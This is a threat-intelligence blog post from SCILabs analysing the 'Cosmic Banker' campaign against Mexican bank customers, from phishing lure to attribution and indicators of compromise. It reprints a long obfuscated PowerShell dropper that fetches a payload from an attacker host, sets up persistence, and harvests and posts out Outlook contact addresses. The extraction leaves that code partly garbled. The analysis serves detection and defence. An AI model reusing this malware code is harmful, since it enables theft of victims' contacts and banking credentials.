12/13/2019Cosmic Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabsCosmic Banker campaign is still active revealing link with Banload malwareblog.scilabs.mx/cosmic-banker-campaign-is-still-active-revealing-link-with-banload-malwarescilabsdiciembre 6, 2019SCILabs identiﬁed a new cosmic banker attack that matches with other previous attacks observed since March 2019. One of the most interesting aspects of this campaign is that the ﬁnal phase executable contains very speciﬁc Portuguese comments that also have been spotted in other reported events. The campaign targets the user credentials of Mexican banking institutions, however, the group behind Cosmic Banker is also the author of another campaign targeting users from Brazil’s banking institutions.Some of the attack elements match with a malicious artifact documented by Trend Micro as Banload, which affected some banks in Brazil. This strengthens the hypothesis that we are dealing with a group that started its attacks in south America and later found in Mexico a new objective in a campaign that SCILabs named Cosmic Banker where the already developed malware simply was reused to target its new attack. It’s also worth mentioning that the reuse of this malware left behind common traces that facilitate the attribution of this campaign to the Brazilian attackers.Even though the indicators of compromise such as hash values, IP addresses and domains change during each attack, the TTP showed by the cyber group changes less frequently, particularly the clear text transfer from a compressed ﬁle named “md.zip”, which includes the ﬁnal toolkit of the attacker which was used to create a YARA rule that allowed to identify other 14 events in the last three months, revealing more activity of this The attack starts with the reception of an email that impersonates Mexico’s tax department “Servicio de Administración Tributaria (SAT)” warning that the victim has a pending tax return. This email includes a link to download a malicious attachment as shown in the following image:url Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabsWhen comparing this phishing email with the observed attack during May 2019 (previously reported by SCILabs), a clear resemblance can be seen between the text and the image used:Although impersonating SAT in emails like these is a common shared tactic by several cyber groups in the region, the fact that the images and text are so similar strengthen the hypothesis that both events belong to the same campaign.When clicking on the link, the ﬁle COMPROBANTE FISCAL.zip is downloaded containing the malicious ﬁle COMPROBANTE FISCAL.bat. Also, it includes a folder named “-“ that includes the legitimate ﬁle GoogleUpdate.exe and another .bat ﬁle with the same content as the ﬁle “COMPROBANTE FISCAL.bat”, therefore clicking either .bat ﬁle triggers the attack. It’s also worth mentioning that the ﬁle “GoogleUpdate.exe” it’s not malicious and isn’t required in any way as part of the attack. The .zip ﬁle is comprised as follows:url Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabsWhen comparing this zip ﬁle with the delivery ﬁle from the May 2019 event (shown in the next image), a great similarity can be seen, since the downloaded ﬁle from that attack also includes the text “comprobante ﬁscal”, however, in this case it’s random text, and a .js ﬁle was used instead of a .bat ﬁle and both cases include non-malicious ﬁles, probably as an attempt to avoid the compressed ﬁle from being blocked by automated detection tools.The ﬁle COMPROBANTE FISCAL.bat from the October 2019 event showed in the following image, includes a batch programming script that executes a PowerShell script from the Internet in order to execute it at memory level. The next part of the program includes command prompts to run the script in a hidden PowerShell window, creating environment variables as an obfuscation method. The malicious PowerShell script gets downloaded from: hxxp://h1m2en[.]ddns[.]net/SA98AS8F7/kk/1445785485The way in which the script runs causes the event to get registered as two independent process executions.url Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabsThe downloaded script from this site is partially obfuscated and contains the following code:url Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabs[System.Net.WebRequest]::Create("url").GetResponse().Close ${_/|\_/|////\__|/_|\\\\\\/|_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AGUA'))) ${_/|\_/|////\__|/_|\\\\\\/\\\\/\/\/\|_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('egBpAHAA'))) ${_/|\_/|////\__|//\\\\\\\\/|_} = "url" ${_/|\_/|/\\\\\\\/|_} = "public" ${_\\\\\\/|\_/|/\\\\\\\/|_} = "c:\users\${_/|\_/|/\\\\\\\/|_}" Function ____////////\\\/\/\/\/\_____ { ${_|||||||||||||________________} = "q","w","e","r","t","y","u","p","a","s","d","f","g","h","j","k","z","x","c","v","b","n","m" ${_|||||||||||||//////________________} = "2_","3_","4_","5_","6_","7_","8_","9_" ${_|||||||||||||//////\\\\\________________} = $null ${__|||||||||||||//////\\\\\________________} = Get-Random -InputObject ${_|||||||||||||________________} -Count 6 ${__||||||_|||||||//////\\\\\________________} = Get-Random -InputObject ${_|||||||||||||//////________________} -Count 1 ${__||||||_||||||_|//////\\\\\________________} = Get-Random -InputObject ${_|||||||||||||________________}.ToUpper() -Count 1 foreach($n in ${__|||||||||||||//////\\\\\________________}) { ${_|||||||||||||//////\\\\\________________} += $n } foreach ($n2 in ${__||||||_|||||||//////\\\\\________________}) { ${_|||||||||||||//////\\\\\________________} += $n2 } foreach ($n3 in ${__||||||_||||||_|//////\\\\\________________}) { ${_|||||||||||||//////\\\\\________________} += $n3 } return "_${_|||||||||||||//////\\\\\________________}" } ${_\\\\\\/|\_/|/\\\___\\\\/|_} = ____////////\\\/\/\/\/\_____ ${_\\\\\__\/|\_/|/\\\___\\\\/|_} = "${_\\\\\\/|\_/|/\\\\\\\/|_}\i.dat" ${_\\\//////////\\__\/|\_/|/\\\___\\\\/|_} = if (${_\\\\\__\/|\_/|/\\\___\\\\/|_}) { Test-Path ${_\\\\\__\/|\_/|/\\\___\\\\/|_} } ${_\\\//////////\\__\/|\_/|/\\\___\\\\/|_} if(${_\\\//////////\\__\/|\_/|/\\\___\\\\/|_} -eq 'True'){ New-Item -ItemType directory -Path ${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_} ${_\\\///////\\\\\\\\\\/_} = new-object System.Net.WebClient ${_\\\///////\\\\\\\\\\/_}.DownloadFile(${_/|\_/|////\__|//\\\\\\\\/|_},"${_\\\\\\/|\_/|/\\\\\\\/|_}\${_ ${_\\\//////||\||||/\\\\\\\/_} = new-object -com shell.application ${_/\/\/\/\/\/\/\/_} = ${_\\\//////||\||||/\\\\\\\/_}.namespace("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_ ${_/\/\/\/\/\/__|\\\||||||\/\/_} = ${_\\\//////||\||||/\\\\\\\/_}.namespace("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}") ${_/\/\/\/\/\/__|\\\||||||\/\/_}.Copyhere(${_/\/\/\/\/\/\/\/_}.items()) Rename-Item -NewName ("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}.${_/|\_/|/// -Path ("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_/|\_/|////\__|/_|\\\\\\/|_}.png") Rename-Item -NewName ("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}.LNS") -Path ("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\12.dll") Rename-Item -NewName ("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\sqlite3.dll") -Path ("${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\sql.png") function _____/\_/\/\_/\/=\ { Param([string]${___/\_/=\___/\_/==},[string]${__/==\/\_/\/=\/\_/}); try{ ${__/\_/=\/=\/=====} = New-Object -ComObject WScript.Shell ${/=\/\__/=\/=\/=\_} = ${__/\_/=\/=\/=====}.CreateShortcut(${___/\_/=\___/\_/==})url Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabs${/=\/\__/=\/=\/=\_}.TargetPath = "${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}.${_/|\_/|//// ${/=\/\__/=\/=\/=\_}.Arguments = " ${_\\\\\\/|\_/|/\\\___\\\\/|_}1.LNS ${_\\\\\\/|\_/|/\\\___\\\\/|_}" ${/=\/\__/=\/=\/=\_}.WorkingDirectory = "${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}" ${/=\/\__/=\/=\/=\_}.WindowStyle = 7 ${/=\/\__/=\/=\/=\_}.IconLocation = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwAlAF ${/=\/\__/=\/=\/=\_}.Save() ${/===\__/=\_/==\_/} = New-Object -Com WScript.Shell ${/=\_/\_/===\/\/\/} = ${/===\__/=\_/==\_/}.SpecialFolders.Item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64Strin del ${/=\_/\_/===\/\/\/}\*.vbs del ${/=\_/\_/===\/\/\/}\*.lnk ${_/=\/=\/\_/\/=\__} = " $env:APPDATA\${_/=\/\/=\___/\/==}, ${_/\/\/\/=\/==\__/}" ${___/\_/\/===\/\__} = "${/=\_/\_/===\/\/\/}\${_\\\\\\/|\_/|/\\\___\\\\/|_}.lnk" _____/\_/\/\_/\/=\ ${___/\_/\/===\/\__} ${_/=\/=\/\_/\/=\__} _____/\_/\/\_/\/=\ "%PUBLIC%\c.lnk" ${_/=\/=\/\_/\/=\__} $bytes = [System.IO.File]::ReadAllBytes("%PUBLIC%\c.lnk") $bytes[0x15] = $bytes[0x15] -bor 0x20 #set byte 21 (0x15) bit 6 (0x20) ON [System.IO.File]::WriteAllBytes("%PUBLIC%\c.lnk", $bytes) function _____/\_/\/\_/\/=\\///\/\/\ { Param([string]${___/\_/=\\/\/\\___/\_/==},[string]${__||_/\_/=\\/\/\\___/\_/==}); try{ ${__||_/\_/=\\/\/||\\___/\_/==} = New-Object -ComObject WScript.Shell ${__||/=\\/\/||\\___/\_/==} = ${__||_/\_/=\\/\/||\\___/\_/==}.CreateShortcut(${___/\_/=\\/\/\\___/\_/==}) ${__||/=\\/\/||\\___/\_/==}.TargetPath = "c:\users\${_/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}.vbs" ${__||/=\\/\/||\\___/\_/==}.Arguments = "" ${__||/=\\/\/||\\___/\_/==}.Description = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgBBAGMAZQBzAHMAYQByACAAYQAgAGkAbgB0AG ${__||/=\\/\/||\\___/\_/==}.WorkingDirectory = "" ${__||/=\\/\/||\\___/\_/==}.IconLocation = "${_/\/\/\/\__/\|_||_|____}" ${__||/=\\/\/||\\___/\_/==}.Save() ${_/\/\/\__\\\\\\\|||\/\/_} = ${_\\\\\\/|\_/|/\\\___\\\\/|_} ${_/\/\/\__\\\\\\\|||\/\/_} | Set-Content "${_\\\\\\/|\_/|/\\\\\\\/|_}\i.dat" ${_/\/\/\__\\\\\\\|||\/\/_} | Out-File "${_\\\\\\/|\_/|/\\\\\\\/|_}\i.dat" ${_/\/\/\__\\\\\\\|||\/\/_} > "${_\\\\\\/|\_/|/\\\\\\\/|_}\i.dat" ${___/\_/\/===\/\__} = "%PUBLIC%\chrome.lnk" _____/\_/\/\_/\/=\\///\/\/\ ${___/\_/\/===\/\__} ${__||_/\_/=\\/\/\\___/\_/==} ${_/|\_/|//______//\__|/_|\\\\\\/|_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABpAG4AZQA='))) ${_/|\_\\\||||||||||///\\/|_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBtAGQA'))) ${_/|\_\\\///\\/|_} = '86' ${_/|\_/|//______//\__|/_|\\\\__\\\///\\/|_} = "$" $Arquivo = "${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}1.LNS"url Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabs$ArquivoSaida ="${_\\\\\\/|\_/|/\\\\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}\${_\\\\\\/|\_/|/\\\___\\\\/|_}1.LNS" Add-Content $Arquivo '#NoTrayIcon' Add-Content $Arquivo "Global ${_/|\_/|//______//\__|/_|\\\\__\\\///\\/|_}${_\\\\\\/|\_/|/\\\___\\\\/|_} = ${_/|\_/|//______//\__|/_|\\\\__\\\///\\/|_}${_/|\_\\\||||||||||///\\/|_}${_/|\_/|//______//\__|/_|\\\\\ [1]" Add-Content $Arquivo "Global ${_/|\_/|//______//\__|/_|\\\\__\\\///\\/|_}${_\\\\\\/|\_/|/\\\___\\\\/|_}${_/|\_\\\///\\/|_} = DllOpen('${_\\\\\\/|\_/|/\\\___\\\\/|_}.LNS')" Add-Content $Arquivo "DllCall(${_/|\_/|//______//\__|/_|\\\\__\\\///\\/|_}${_\\\\\\/|\_/|/\\\___\\\\/|_}${_/|\_\\\///\\/|_}, $cmdFileName = "%WINDIR%\explorer.exe " $TaskStartTime = [datetime]::Now.AddSeconds(180) $TaskEndTime = [datetime]::Now.AddSeconds(240) $taskName = ${_\\\\\\/|\_/|/\\\___\\\\/|_} $service = New-Object -ComObject("Schedule.Service") $service.Connect() $rootFolder = $service.GetFolder("\") $TaskDefinition = $service.NewTask(0) $TaskDefinition.RegistrationInfo.Description = "" $TaskDefinition.Settings.Enabled = $true $TaskDefinition.Settings.DisallowStartIfOnBatteries = $false $TaskDefinition.Settings.DeleteExpiredTaskAfter = "PT0M" $triggers = $TaskDefinition.Triggers $trigger = $triggers.Create(1) $trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss") $trigger.EndBoundary = $TaskEndTime.ToString("yyyy-MM-dd'T'HH:mm:ss") $trigger.Enabled = $true $action = $TaskDefinition.Actions.Create(0) $action.Path = $cmdFileName $action.Arguments = "${/=\_/\_/===\/\/\/}\${_\\\\\\/|\_/|/\\\___\\\\/|_}.lnk" $action = $TaskDefinition.Actions.Create(0) $action.Path = "schtasks.exe" $action.Arguments = "/Delete /TN $taskName /F" $rootFolder.RegisterTaskDefinition($taskName, $TaskDefinition, 6, "", $null, 0) Add-Type -assembly $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBPAGYAZgBpAG ${_/=\/\__/=\/\/\__} = New-Object -comobject Outlook.Application ${____/===\_____/\/} = ${_/=\/\__/=\/\/\__}.GetNameSpace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBB ${_/\/=====\__/=\/=} = [System.Collections.ArrayList]@() function ___/=\/\/=\___/=\_(${____/\____/\/\_/\_}) { ${____/==\__/\_/=\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbAF8AYQAtAHoAMAAtADkALQBdACsAKABcAC if (${____/\____/\/\_/\_} -match ${____/==\__/\_/=\_}) { function _/=\_/==\____/\__/(${____/\____/\/\_/\_}) { if (${____/\____/\/\_/\_}) { ${__/=====\/\_/\_/\} = $false ${____/\____/\/\_/\_} = ${____/\____/\/\_/\_}.ToLower() if (${____/\____/\/\_/\_}.StartsWith("'") -And ${____/\____/\/\_/\_}.EndsWith("'")) {url Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabs${____/\____/\/\_/\_} = ${____/\____/\/\_/\_}.Substring(1, ${____/\____/\/\_/\_}.Length - 2) } if (___/=\/\/=\___/=\_(${____/\____/\/\_/\_})) { for(${__/\/\__/=\/\__/\} = 0;${__/\/\__/=\/\__/\} -lt ${_/\/=====\__/=\/=}.Count;${__/\/\__/=\/\__/\}++) { if (${_/\/=====\__/=\/=}[${__/\/\__/=\/\__/\}] -eq ${____/\____/\/\_/\_}) { ${__/=====\/\_/\_/\} = $true if (-Not ${__/=====\/\_/\_/\}) { ${__/\___/========\} = ${_/\/=====\__/=\/=}.Add(${____/\____/\/\_/\_}) function _/====\__/=====\_/ { ${/==\/=\____/\_/=\} = ${____/===\_____/\/}.AddressLists for(${__/\/\__/=\/\__/\} = 1;${__/\/\__/=\/\__/\} -le ${/==\/=\____/\_/=\}.Count;${__/\/\__/=\/\__/\}++) { ${/=\_/==\/\__/==\_} = ${/==\/=\____/\_/=\}.Item(${__/\/\__/=\/\__/\}).AddressEntries for(${/==\/\/\_/\_/\__/} = 1;${/==\/\/\_/\_/\__/} -le ${/=\_/==\/\__/==\_}.Count;${/==\/\/\_/\_/\__/}++) { ${_/\_/\__/\_____/=} = ${/=\_/==\/\__/==\_}.Item(${/==\/\/\_/\_/\__/}) ${__/===\/===\/\/\_} = ${_/\_/\__/\_____/=}.AddressEntryUserType ${____/\____/\/\_/\_} = "" if (${__/===\/===\/\/\_} -eq 10) { ${____/\____/\/\_/\_} = ${_/\_/\__/\_____/=}.Address } elseif ((${__/===\/===\/\/\_} -eq 3) -Or (${__/===\/===\/\/\_} -eq 1) -Or (${__/===\/===\/\/\_} -eq 4) -Or (${__/===\/===\/\/\_} -eq 2) -Or (${__/===\/===\/\/\_} -eq 5) -Or (${__/===\/===\/\/\_} -eq 0)) { ${____/\____/\/\_/\_} = ${_/\_/\__/\_____/=}.GetExchangeUser().PrimarySmtpAddress } _/=\_/==\____/\__/(${____/\____/\/\_/\_}) function __/\/\__/\_/===\_/(${___/\/==\_/==\/=\/}) { for(${__/\/\__/=\/\__/\} = 1;${__/\/\__/=\/\__/\} -le ${___/\/==\_/==\/=\/}.Count;${__/\/\__/=\/\__/\}++) { ${_/======\_/=\/=\_} = ${___/\/==\_/==\/=\/}.Item(${__/\/\__/=\/\__/\}) ${__/\/=\___/\_/==\} = ${_/======\_/=\/=\_}.Items for(${/==\/\/\_/\_/\__/} = 1;${/==\/\/\_/\_/\__/} -le ${__/\/=\___/\_/==\}.Count;${/==\/\/\_/\_/\__/}++) { ${_/==\_____/==\__/} = ${__/\/=\___/\_/==\}.Item(${/==\/\/\_/\_/\__/}) ${/=\/====\____/=\/} = ${_/==\_____/==\__/}.Recipients for(${_/\_/\__/\/\_/=\_} = 1;${_/\_/\__/\/\_/=\_} -le ${/=\/====\____/=\/}.Count;${_/\_/\__/\/\_/=\_}++) { ${__/\_/\__/=\/\_/\} = ${/=\/====\____/=\/}.Item(${_/\_/\__/\/\_/=\_}) ${_/\_/\__/\_____/=} = ${__/\_/\__/=\/\_/\}.AddressEntry ${__/===\/===\/\/\_} = ${_/\_/\__/\_____/=}.AddressEntryUserType ${____/\____/\/\_/\_} = ""; if (${__/===\/===\/\/\_} -eq 0) { ${____/\____/\/\_/\_} = ${_/\_/\__/\_____/=}.GetExchangeUser().PrimarySmtpAddress } elseif ((${__/===\/===\/\/\_} -eq 30) -Or (${__/===\/===\/\/\_} -eq 10)) { ${____/\____/\/\_/\_} = ${_/\_/\__/\_____/=}.Address } _/=\_/==\____/\__/(${____/\____/\/\_/\_}) } ${_/\_/\__/\_____/=} = ${_/==\_____/==\__/}.Sender ${__/===\/===\/\/\_} = ${_/\_/\__/\_____/=}.AddressEntryUserType ${____/\____/\/\_/\_} = ""; if (${__/===\/===\/\/\_} -eq 0) { ${____/\____/\/\_/\_} = ${_/\_/\__/\_____/=}.GetExchangeUser().PrimarySmtpAddress } elseif ((${__/===\/===\/\/\_} -eq 30) -Or (${__/===\/===\/\/\_} -eq 10)) {url Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabs${____/\____/\/\_/\_} = ${_/\_/\__/\_____/=}.Address } _/=\_/==\____/\__/(${____/\____/\/\_/\_}) } __/\/\__/\_/===\_/(${_/======\_/=\/=\_}.Folders) function ____/=\_/\_/==\/==() { _/====\__/=====\_/ __/\/\__/\_/===\_/(${____/===\_____/\/}.Folders) Add-Content $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64Str $WebRequest = [System.Net.WebRequest]::Create("url") $GlobalListStr = [System.Text.Encoding]::UTF8.GetBytes("list=$(${_/\/=====\__/=\/=} -join ';')") $WebRequest.Method = 'POST' $WebRequest.ContentType = 'application/x-www-form-urlencoded' $WebRequest.ContentLength = $GlobalListStr.length $RequestStream = $WebRequest.GetRequestStream() $RequestStream.Write($GlobalListStr, 0, $GlobalListStr.length) $RequestStream.Close() [System.Net.WebResponse] $WebResponse = $WebRequest.GetResponse() function _/=\/\/\_/\____/=\() { ${__/==\/\__/\/===\} = [System.IO.File]::Exists(${__/======\____/\_}) if (-Not ${__/==\/\__/\/===\}) { "" | sc ${__/======\____/\_} ____/=\_/\_/==\/== _/=\/\/\_/\____/=\This PowerShell script runs the following actions:Downloads the ﬁle: hxxp://dgi1b2n3m4[.]ddns[.]net/0111/kk/md.zip, which includes the DLL main malware library, the executable loader part of the Autolt toolkit and other services. The structure of the md.zip ﬁle is shown in the following image:Subsequently, the script generates a random variable formatted as follows: _ 6 lower case letters + 1 dígit + “_” + “upper case letter. This random variable is deﬁned in the following PowerShell function, which is the non- obfuscated version by SCILabs.url Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabsIt then creates a folder with the random variable in the folder “%Public%”, extracts the ﬁles from md.zip, puts them inside the random named folder and renames them as follows:12.dll -> nombre aleatorio.LNS exe.png -> nombre aleatorio.exe sql.png -> sqlite3.dllIt also creates the ﬁle “random name1.LNS” with the following contents:Lastly, the script asks for MAPI access to try to access to Microsoft Outlook and then looks for the contacts email accounts in order to extract them and send them to the cyberactors through a POST web request to the following resource: “hxxp://dgi1b2n3m4[.]ddns[.]net/lists/kk/index.php?list”.In order to gain access to Microsoft Outlook MAPI, the malware requires the user authorization, that’s why the request prompt will appear in a window like the following one:Additionally, the PowerShell script includes several base64 coded text strings. The corresponding text strings are listed below, where some associated with startup persistence features stand out, as well as the name of one of them which allows to access to Outlook information through MAPI and a regular expression to identify email accounts ([_a-z0-9-]+(\. [_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$):exe zip %ProgramFiles%\Internet Explorer\iexplore.exe,1 startup «Acessar a internet.» Line Cmdurl Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabsMicrosoft.Ofﬁce.Interop.Outlook MAPI ^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$, $env:APPDATA\Microsoft\.OutlookThe main malicious ﬁle 12.dll, renamed to “<random>.LNS and saved in the folder %Public%, has text strings in Portuguese which seem to refer to the possible capabilities of this program and/or depuration text. These text strings were only identiﬁed in the executed program and not in the binary, since the program is protected with the VMProtect packer, which makes these text strings unable to be displayed with static analysis techniques.When comparing these text strings with the ones from the May 2019 event, it was identiﬁed that a lot of them are the same, meaning that both events were carried out by the same group of attackers. As a reference, in the following image the text strings of the May event are shown, which also were obtained from the memory process and not from the program, since this one was also protected with the VMProtect packer.url Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabsThe malware artifact from May 2019 had other text strings which refer to the update of data or passwords, as a procedure to try to con the user to disclose its access credentials of banking websites . In the following image are shown some of the text strings:Similar strings were identiﬁed in the DLL malware from October 2019 but coded with the XOR algorithm and the 0x20 key. The identiﬁed text string suggests that at some point it will ask a “security code shown in a device”, as well as another string that refers to an alleged “data update.”In the October 2019 malware analysis wasn’t identiﬁed text strings from Mexican banking institutions, which makes possible that such strings were hidden in a more advanced way than the May 2019 malware sample. Based on the image similarities and the delivered email text, text strings in the malicious programs and the download zip ﬁle as a generalized TTP, SCILabs determines with a medium conﬁdence level that this is the same attacker. It’s also worth mentioning that with a larger number of events with these artifacts the level of reliability of this claim could increase.The following image show text strings from Mexican banking institutions identiﬁed in the May 2019 malware and that are closer from other text strings from Brazil’s ﬁnancial institutions.When looking for information related to the md.zip ﬁle in open sources, an event in March 2019 was identiﬁed where the attacker also used another ﬁle with the same name and with similar names in the included ﬁles. This campaign was documented by TrendMicro as Banload malware where is mentioned that it is targeting Brazil’s banking institutions. In the following image is described the structure of the md.zip ﬁle:One of the differences of the TrendMicro event, is that the internal malicious ﬁle was called pp.png and in the recent events is called 12.dll but maintaining a similar name for the rest of the ﬁles.url Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabsBy doing a more in-depth analysis of these ﬁles, it was identiﬁed that pp.png is actually a non-obfuscated executable which included names of Mexican banking institutions, as well as text strings related with changing password credentials. Apparently in the last months, the cyber attackers included the use of the VMProtect packer to make harder the analysis of the malicious program. In the following image are shown the identiﬁed text strings of the Mexican banking institutions identiﬁed in the pp.png program.Based on this ﬁnding, SCILabs created a YARA rule to identify ﬁles that contain ﬁles with the names exe.png, libeay32.dll, ssleay32.dll and sql.png that might belong to the same Cosmic Banker campaign.When looking for additional malware in a private source with this YARA rule, 14 additional compressed ﬁles were found with the name md.zip including a DLL ﬁle with the name 12.dll, which match with the event observed in October 2019. It was also identiﬁed an additional ﬁle named Java_qeyghf8_V.zip which also contains the pp.png ﬁle. The malware detection rate ﬂuctuates from 9 to 27 antivirus search engines from close to a total of 60, making the detection rate a little low even though some of the ﬁles were observed since August. In the following image a section of these ﬁles is shown:url Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabsThe 12.dll ﬁles included in the md.zip compressed ﬁles are packed with VMProtect and therefore don’t reveal the comments in Portuguese, also all of them were identiﬁed linked with the same Delphi version. It’s worth mentioning that the pp.png ﬁle is the only one without VMProtect packing.When analyzing the properties of Cosmic Banker malware from the May 2019 event, the tomanocu.jpg ﬁle was identiﬁed as protected with the same packer and also being a PE Delphi ﬁle.However, in this event the text strings were recovered directly from the memory, revealing the same observed behavior:url Banker campaign is still active revealing link with Banload malware – SCIBlog – Powered by SCILabsBased on the identiﬁed texts, apparently the goal is to steal the bank credentials from Mexican ﬁnancial institution users by showing some text related to an alleged data update request. Also, the malware is able to access Outlook info to collect the email accounts from the contacts list, however, this kind of access could also be used to send emails, impersonating the victim in Business Email Compromise (BEC) attacks. Indicators of CompromiseNetwork IndicatorsDNS Requests h1m2en.ddns.net dgi1b2n3m4.ddns.netIP Addresses hxxp://dgi1b2n3m4.ddns.net/lists/kk/index.php?list hxxp://unbouncepages.com/comprobntes-ilimitdsllqosdnm49yt8 hxxp://h1m2en.ddns.net/SA98AS8F7/kk/1445785485 Host Indicators%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\<aleatorio>.lnk%PUBLIC%\i.dat%PUBLIC%\c.lnkComprobante Fiscal.bat Hash Values: (md5, sha1, sha256)COMPROBANTE FISCAL.zip Otros archivos 12.dll identiﬁcados en fuentes abiertas: Otros archivos md.zip maliciosos identiﬁcados en fuentes abiertas: 